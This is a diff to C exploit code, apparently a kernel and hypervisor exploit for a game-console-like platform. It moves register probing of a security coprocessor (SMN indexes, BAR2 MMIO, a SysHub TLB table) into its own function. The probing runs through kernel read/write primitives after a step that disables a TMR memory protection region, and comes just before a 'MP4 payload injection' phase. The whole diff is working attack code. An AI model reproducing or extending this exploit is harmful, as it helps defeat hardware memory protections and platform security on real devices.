@@ -173,6 +173,70 @@ static int cfi_bypass(struct phys_rw_ctx *ctx)
 /*
  * Main exploit entry point.
  */
+/* Separated into own function to avoid stack bloat in prosperous_run */
+static void phase1_5_smn_bar2_probe(struct phys_rw_ctx *ctx)
+{
+    uint64_t dmap = ctx->dmap_base;
+
+    /* === SMN probe via B0:D0:F0+0x60/0x64 ===
+     * Same mechanism TMR code uses every run. */
+    printf("\n[*] Part B: SMN probe (B0:D0:F0+0x60/0x64)...\n");
+    {
+        uint64_t smn_idx = dmap + PCI_B0D0F0 + 0x60;
+        uint64_t smn_dat = dmap + PCI_B0D0F0 + 0x64;
+
+        /* Verify mechanism works: read known TMR reg */
+        uint32_t test_addr = 0x00052080;
+        kernel_copyin(&test_addr, smn_idx, 4);
+        uint32_t test_val;
+        kernel_copyout(smn_dat, &test_val, 4);
+        printf("[SMN] 0x%08x = 0x%08x (TMR20 base, expect 0x00006000)\n",
+               test_addr, test_val);
+
+        /* Probe MP4-related ranges */
+        uint32_t smn_addrs[] = {
+            0x00015000, 0x00015004, 0x00015008, 0x0001500C,
+            0x00016000, 0x00016004, 0x00016008, 0x0001600C,
+            0x0003E000, 0x0003E004, 0x0003E008, 0x0003E00C,
+            0x0003F000, 0x0003F004, 0x0003F008, 0x0003F00C,
+            0x15800000, 0x15800004, 0x15800008, 0x1580000C,
+            0x15C00000, 0x15C00004, 0x15C00008, 0x15C0000C,
+            0x15C10000, 0x15C10004, 0x15C10008, 0x15C1000C,
+            0x15C20000, 0x15C20004, 0x15C20008, 0x15C2000C,
+        };
+
+        for (int i = 0; i < 32; i++) {
+            uint32_t addr = smn_addrs[i];
+            kernel_copyin(&addr, smn_idx, 4);
+            uint32_t val;
+            kernel_copyout(smn_dat, &val, 4);
+
+            if (i % 4 == 0)
+                printf("[SMN] 0x%08x:", addr);
+            printf(" %08x", val);
+            if (i % 4 == 3)
+                printf("\n");
+        }
+    }
+
+    /* === BAR2+0x200000 first 16 registers ===
+     * Known-good offset, 16 reads only. */
+    printf("\n[*] Part C: BAR2+0x200000 registers (64 bytes)...\n");
+    {
+        uint64_t bar2 = dmap + MP4_BAR2_PA;
+        for (int i = 0; i < 4; i++) {
+            uint32_t vals[4];
+            for (int j = 0; j < 4; j++) {
+                kernel_copyout(bar2 + 0x200000 + (i*4+j)*4,
+                               &vals[j], 4);
+            }
+            printf("[BAR2] +0x%06x: %08x %08x %08x %08x\n",
+                   0x200000 + i * 16, vals[0], vals[1],
+                   vals[2], vals[3]);
+        }
+    }
+}
+
 int prosperous_run(void)
 {
     struct phys_rw_ctx ctx;
@@ -212,13 +276,8 @@ int prosperous_run(void)
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
 
-    /* Phase 1.5: SysHub TLB analysis + SMN probe (correct registers)
-     *
-     * CONFIRMED:
-     *   ACCESSIBLE: PA 0x605F0000-0x60FFFFFF (R/W works)
-     *   BLOCKED:    PA 0x60000000-0x605EFFFF (nPT, rc=-1)
-     *   GPU MMIO:   HV-trapped (all 0xFFFFFFFF)
-     *   SysHub TLB table at PA 0x607F0000 decoded (7 entries)
+    /* Phase 1.5: SysHub TLB + SMN + BAR2 probe
+     * Part A inline (small stack). Parts B+C in separate function.
      *
      * PREVIOUS CRASH ROOT CAUSE: Wrote SMN addresses to B0:D18:F2+0x64
      *   (wrong register — that's a DF register, NOT SMN). Correct SMN
@@ -232,103 +291,32 @@ int prosperous_run(void)
      *      Same mechanism TMR code uses — proven safe.
      *   C. Read BAR2+0x200000 first 16 registers (known safe offset)
      */
-    printf("\n[*] Phase 1.5: TLB + SMN probe (correct path)...\n");
+    printf("\n[*] Phase 1.5: TLB + SMN probe...\n");
     {
         uint64_t dmap = ctx.dmap_base;
 
-        /* === Part A: SysHub TLB descriptor table ===
-         * SAFE: PD[0x103] range, proven accessible. */
+        /* Part A: SysHub TLB table - small chunks to minimize stack */
         printf("[*] Part A: SysHub TLB table (512 bytes)...\n");
-        {
-            uint32_t buf[128];
-            for (int w = 0; w < 128; w++)
-                kernel_copyout(dmap + 0x607F0000ULL + w * 4, &buf[w], 4);
-            for (int row = 0; row < 32; row++) {
+        for (int chunk = 0; chunk < 8; chunk++) {
+            uint32_t buf[16]; /* 64 bytes per chunk */
+            for (int w = 0; w < 16; w++)
+                kernel_copyout(dmap + 0x607F0000ULL + (chunk*16+w)*4,
+                               &buf[w], 4);
+            for (int row = 0; row < 4; row++) {
                 printf("[TLB] +%03x: %08x %08x %08x %08x\n",
-                       row * 16, buf[row*4], buf[row*4+1],
+                       (chunk*4+row) * 16, buf[row*4], buf[row*4+1],
                        buf[row*4+2], buf[row*4+3]);
             }
         }
 
-        /* === Part B: SMN probe via B0:D0:F0+0x60/0x64 ===
-         * This is the CORRECT SMN indirect path. TMR code uses it
-         * every single run. We probe MP4-related controller regs.
-         *
-         * Known working SMN addrs (from TMR code):
-         *   0x00052000+ (DF F2 TMR registers)
-         *
-         * Probing (controller regs only, NOT 0x60xxxxxx DRAM):
-         *   0x00015000-0x00016000 (MP4 low config)
-         *   0x0003E000-0x0003F000 (SysHub TLB control)
-         *   0x15800000-0x15803000 (MP4 internal space, guess)
-         *   0x15C00000-0x15C03000 (MP4 internal space, guess)
-         *
-         * SAFE: Same register pair TMR uses. Non-existent SMN addrs
-         * return 0 or 0xFFFFFFFF without side effects. */
-        printf("\n[*] Part B: SMN probe (B0:D0:F0+0x60/0x64)...\n");
-        {
-            uint64_t smn_idx = dmap + PCI_B0D0F0 + 0x60;
-            uint64_t smn_dat = dmap + PCI_B0D0F0 + 0x64;
-
-            /* First verify the mechanism works: read a known TMR reg */
-            uint32_t test_addr = 0x00052080; /* TMR 20 base reg */
-            kernel_copyin(&test_addr, smn_idx, 4);
-            uint32_t test_val;
-            kernel_copyout(smn_dat, &test_val, 4);
-            printf("[SMN] 0x%08x = 0x%08x (TMR20 base, expect 0x00006000)\n",
-                   test_addr, test_val);
-
-            /* Now probe MP4-related ranges */
-            uint32_t smn_addrs[] = {
-                /* Low MP4 config space */
-                0x00015000, 0x00015004, 0x00015008, 0x0001500C,
-                0x00016000, 0x00016004, 0x00016008, 0x0001600C,
-                /* SysHub TLB control */
-                0x0003E000, 0x0003E004, 0x0003E008, 0x0003E00C,
-                0x0003F000, 0x0003F004, 0x0003F008, 0x0003F00C,
-                /* MP4 internal (Aeolia/Belize typical) */
-                0x15800000, 0x15800004, 0x15800008, 0x1580000C,
-                0x15C00000, 0x15C00004, 0x15C00008, 0x15C0000C,
-                /* MP4 DRAM controller (speculation) */
-                0x15C10000, 0x15C10004, 0x15C10008, 0x15C1000C,
-                0x15C20000, 0x15C20004, 0x15C20008, 0x15C2000C,
-            };
-
-            for (int i = 0; i < 32; i++) {
-                uint32_t addr = smn_addrs[i];
-                kernel_copyin(&addr, smn_idx, 4);
-                uint32_t val;
-                kernel_copyout(smn_dat, &val, 4);
-
-                /* Print all values (even 0/FF) for first run to
-                 * understand what's at each address */
-                if (i % 4 == 0)
-                    printf("[SMN] 0x%08x:", addr);
-                printf(" %08x", val);
-                if (i % 4 == 3)
-                    printf("\n");
-            }
-        }
-
-        /* === Part C: BAR2+0x200000 first 16 registers ===
-         * BAR2+0x200000 returned 0x00058184 in multiple runs.
-         * Read the first 64 bytes at this offset only (no sweep).
-         * SAFE: single known-good offset, 16 reads. */
-        printf("\n[*] Part C: BAR2+0x200000 registers (64 bytes)...\n");
-        {
-            uint64_t bar2 = dmap + MP4_BAR2_PA;
-            for (int i = 0; i < 4; i++) {
-                uint32_t vals[4];
-                for (int j = 0; j < 4; j++) {
-                    kernel_copyout(bar2 + 0x200000 + (i*4+j)*4,
-                                   &vals[j], 4);
-                }
-                printf("[BAR2] +0x%03x: %08x %08x %08x %08x\n",
-                       0x200000 + i * 16, vals[0], vals[1],
-                       vals[2], vals[3]);
-            }
-        }
+        /* Sanity check */
+        uint32_t val = 0xDEADDEAD;
+        int32_t rc = kernel_copyout(dmap + 0x60700000ULL, &val, 4);
+        printf("[DRAM] PA 0x60700000 = 0x%08x (rc=%d)\n", val, rc);
     }
+
+    /* Parts B+C in separate function (own stack frame) */
+    phase1_5_smn_bar2_probe(&ctx);
 
     /* Phase 2: MP4 payload injection */
     printf("\n[*] Phase 2: MP4 payload injection...\n");
